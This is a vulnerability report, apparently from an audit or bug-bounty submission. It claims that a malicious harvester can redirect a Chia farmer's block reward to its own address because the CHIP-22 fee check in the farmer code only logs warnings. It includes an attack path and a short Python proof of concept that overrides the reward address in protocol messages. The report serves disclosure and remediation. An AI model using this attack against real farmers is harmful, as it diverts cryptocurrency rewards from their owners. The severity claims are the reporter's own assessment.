### Title
Malicious Harvester Can Unconditionally Redirect Farmer Block Reward via Unenforced CHIP-22 Fee Convention — (`chia/farmer/farmer_api.py`, `chia/farmer/farmer.py`)

### Summary

The CHIP-22 fee convention allows third-party harvesters to redirect the farmer's block reward (`farmer_reward_puzzle_hash`) to an arbitrary address as a fee, subject to a quality threshold check. However, the farmer's enforcement of this convention is limited to logging a warning — the farmer never rejects or overrides the attacker-supplied address. A malicious harvester with valid plots can set `farmer_reward_address_override` to any arbitrary puzzle hash, causing the farmer's own plot key to sign a block that sends the 2 XCH farmer reward to the attacker's address.

### Finding Description

**Root cause:** In `FarmerAPI.new_proof_of_space()`, when a harvester sends `NewProofOfSpace` with `farmer_reward_address_override` set, the farmer calls `notify_farmer_reward_taken_by_harvester_as_fee()`. This function checks the CHIP-22 fee quality convention and emits a warning log if the convention is violated — but it **does not reject the override, does not return a signal to the caller, and does not prevent the block-making flow from continuing**. [1](#0-0) 

The farmer then proceeds to send `RequestSignatures` to the harvester. When the harvester responds with `RespondSignatures` (which also carries `farmer_reward_address_override`), `_process_respond_signatures()` unconditionally substitutes the attacker-controlled address as the farmer reward destination: [2](#0-1) 

The resulting `DeclareProofOfSpace` is sent to the full node with the attacker's puzzle hash as `farmer_reward_address`. The full node creates a block whose foliage is signed by the farmer's plot key, committing the farmer reward to the attacker's address. [3](#0-2) 

The enforcement function `notify_farmer_reward_taken_by_harvester_as_fee` only logs: [4](#0-3) 

The `RespondSignatures` protocol message carries `farmer_reward_address_override` as an optional field with no server-side validation: [5](#0-4) 

**Attack path:**
1. Attacker operates a harvester with valid plots and connects to a victim farmer.
2. Harvester finds a valid proof of space qualifying for a block.
3. Harvester sends `NewProofOfSpace` with `farmer_reward_address_override = attacker_puzzle_hash` and `fee_info = None` (or an invalid threshold).
4. Farmer logs a warning but does not abort — proceeds to send `RequestSignatures`.
5. Harvester responds with `RespondSignatures` containing `farmer_reward_address_override = attacker_puzzle_hash`.
6. Farmer's `_process_respond_signatures` uses the attacker's address as `farmer_reward_address` in `DeclareProofOfSpace`.
7. Full node creates a block; the farmer's plot key signs foliage committing the 2 XCH farmer reward to the attacker's address.
8. Block is confirmed; attacker receives the farmer's block reward.

### Impact Explanation

**High — Unauthorized reward diversion affecting XCH.** A malicious third-party harvester (an unprivileged role requiring only valid plots and a network connection to the farmer) can permanently redirect the farmer's 2 XCH block reward to an arbitrary address on every block the attacker's plots win. The farmer's own cryptographic key signs the diversion. There is no on-chain or protocol-level mechanism to detect or reverse this after block confirmation.

### Likelihood Explanation

Third-party harvesters are a supported and common deployment pattern in Chia (the entire CHIP-22 mechanism exists to enable them). Any operator of a third-party harvester service can exploit this against every farmer who connects to them. No privileged access, leaked keys, or cryptographic breaks are required — only valid farming plots.

### Recommendation

In `FarmerAPI.new_proof_of_space()`, enforce the CHIP-22 fee convention: if `farmer_reward_address_override` is set but `fee_info` is absent, or if `fee_quality > applied_fee_threshold`, **abort the block-making flow** (do not send `RequestSignatures`) rather than merely logging a warning.

Additionally, in `_process_respond_signatures()`, before applying `response.farmer_reward_address_override`, verify that the fee convention was satisfied for this proof. If not, fall back to `self.farmer.farmer_target`.

### Proof of Concept

```python
# Malicious harvester intercepts and overrides farmer reward address
# (mirrors the test pattern in test_third_party_harvesters.py)

async def intercept_new_proof_of_space(self, request, peer):
    # Inject attacker's address as farmer_reward_address_override
    # with no fee_info (fee convention violated)
    request = dataclasses.replace(
        request,
        farmer_reward_address_override=ATTACKER_PUZZLE_HASH,
        fee_info=None,  # No fee info → convention violated → only a log warning
    )
    # Farmer logs warning but still proceeds to RequestSignatures
    await FarmerAPI.new_proof_of_space(farmer.server.api, request, peer)

async def intercept_respond_signatures(self, request):
    result_msg = await HarvesterAPI.request_signatures(harvester.server.api, request)
    # Override farmer_reward_address_override in RespondSignatures
    response = dataclasses.replace(
        RespondSignatures.from_bytes(result_msg.data),
        farmer_reward_address_override=ATTACKER_PUZZLE_HASH,
    )
    return make_msg(ProtocolMessageTypes.respond_signatures, response)
    # Farmer unconditionally uses ATTACKER_PUZZLE_HASH as farmer_reward_address
    # Block is created; 2 XCH farmer reward goes to attacker
``` [6](#0-5)

### Citations

**File:** chia/farmer/farmer_api.py (L127-129)
```python
            if required_iters < calculate_sp_interval_iters(self.farmer.constants, sp.sub_slot_iters):
                if new_proof_of_space.farmer_reward_address_override is not None:
                    self.farmer.notify_farmer_reward_taken_by_harvester_as_fee(sp, new_proof_of_space)
```

**File:** chia/farmer/farmer_api.py (L916-919)
```python
                    farmer_reward_address = self.farmer.farmer_target
                    if response.farmer_reward_address_override is not None:
                        farmer_reward_address = response.farmer_reward_address_override
                        include_source_signature_data = True
```

**File:** chia/farmer/farmer.py (L888-934)
```python
    def notify_farmer_reward_taken_by_harvester_as_fee(
        self, sp: farmer_protocol.NewSignagePoint, proof_of_space: harvester_protocol.NewProofOfSpace
    ) -> None:
        """
        Apply a fee quality convention (see CHIP-22: https://github.com/Chia-Network/chips/pull/88)
        given the proof and signage point. This will be tested against the fee threshold reported
        by the harvester (if any), and logged.
        """
        assert proof_of_space.farmer_reward_address_override is not None

        challenge_str = str(sp.challenge_hash)

        ph_prefix = self.config["network_overrides"]["config"][self.config["selected_network"]]["address_prefix"]
        farmer_reward_puzzle_hash = encode_puzzle_hash(proof_of_space.farmer_reward_address_override, ph_prefix)

        self.log.info(
            f"Farmer reward for challenge '{challenge_str}' "
            + f"taken by harvester for reward address '{farmer_reward_puzzle_hash}'"
        )

        fee_quality = calculate_harvester_fee_quality(proof_of_space.proof.proof, sp.challenge_hash)
        fee_quality_rate = float(fee_quality) / float(0xFFFFFFFF) * 100.0

        if proof_of_space.fee_info is not None:
            fee_threshold = proof_of_space.fee_info.applied_fee_threshold
            fee_threshold_rate = float(fee_threshold) / float(0xFFFFFFFF) * 100.0

            if fee_quality <= fee_threshold:
                self.log.info(
                    f"Fee threshold passed for challenge '{challenge_str}': "
                    + f"{fee_quality_rate:.3f}%/{fee_threshold_rate:.3f}% ({fee_quality}/{fee_threshold})"
                )
            else:
                self.log.warning(
                    f"Invalid fee threshold for challenge '{challenge_str}': "
                    + f"{fee_quality_rate:.3f}%/{fee_threshold_rate:.3f}% ({fee_quality}/{fee_threshold})"
                )
                self.log.warning(
                    "Harvester illegitimately took a fee reward that "
                    + "did not belong to it or it incorrectly applied the fee convention."
                )
        else:
            self.log.warning(
                "Harvester illegitimately took reward by failing to provide its fee rate "
                + f"for challenge '{challenge_str}'. "
                + f"Fee quality was {fee_quality_rate:.3f}% ({fee_quality} or 0x{fee_quality:08x})"
            )
```

**File:** chia/protocols/harvester_protocol.py (L129-140)
```python
@streamable
@dataclass(frozen=True)
class RespondSignatures(Streamable):
    plot_identifier: str
    challenge_hash: bytes32
    sp_hash: bytes32
    local_pk: G1Element
    farmer_pk: G1Element
    message_signatures: list[tuple[bytes32, G2Element]]
    include_source_signature_data: bool
    farmer_reward_address_override: bytes32 | None

```

**File:** chia/_tests/farmer_harvester/test_third_party_harvesters.py (L122-139)
```python
    async def intercept_harvester_request_signatures(
        self: HarvesterAPI, request: harvester_protocol.RequestSignatures
    ) -> Message | None:
        nonlocal harvester
        nonlocal farmer_reward_address

        validate_harvester_request_signatures(request)
        result_msg: Message | None = await HarvesterAPI.request_signatures(
            cast(HarvesterAPI, harvester.server.api), request
        )
        assert result_msg is not None

        # Inject overridden farmer reward address
        response: RespondSignatures = dataclasses.replace(
            RespondSignatures.from_bytes(result_msg.data), farmer_reward_address_override=farmer_reward_address
        )

        return make_msg(ProtocolMessageTypes.respond_signatures, response)
```
